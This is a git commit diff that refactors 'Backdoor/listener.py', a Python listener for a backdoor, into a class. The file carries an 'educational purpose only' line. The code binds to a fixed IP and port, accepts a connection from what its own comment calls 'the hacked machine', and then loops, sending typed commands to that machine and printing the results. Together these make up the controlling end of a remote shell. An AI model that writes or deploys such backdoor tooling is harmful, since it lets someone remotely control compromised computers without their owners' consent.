706e929c96afb54790b376ba0269b489dbc5ba50
Sheldon Pang <SheldonLinkedin@yahoo.com>
2022-07-15 15:26:09 -0700

    v1.1 refactor as a class

--- Backdoor/listener.py
+++ Backdoor/listener.py
@@ -8,18 +8,29 @@ Please use for educational purpose only...
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection.")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    def execute_remote_command(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            result = self.execute_remote_command(command)
+            print(result)
+
 
 # Replace ip with the ip of the hacked machine
-listener.bind(("192.168.1.23", 4444))
-listener.listen(0)
-print("[+] Waiting for incoming connection.")
-connection, address = listener.accept()
-print("[+] Got a connection from " + str(address))
-
-while True:
-    command = input(">> ")
-    connection.send(command)
-    result = connection.recv(1024)
-    print(result)
+my_listener = Listener("192.168.1.23", 4444)
+my_listener.run()
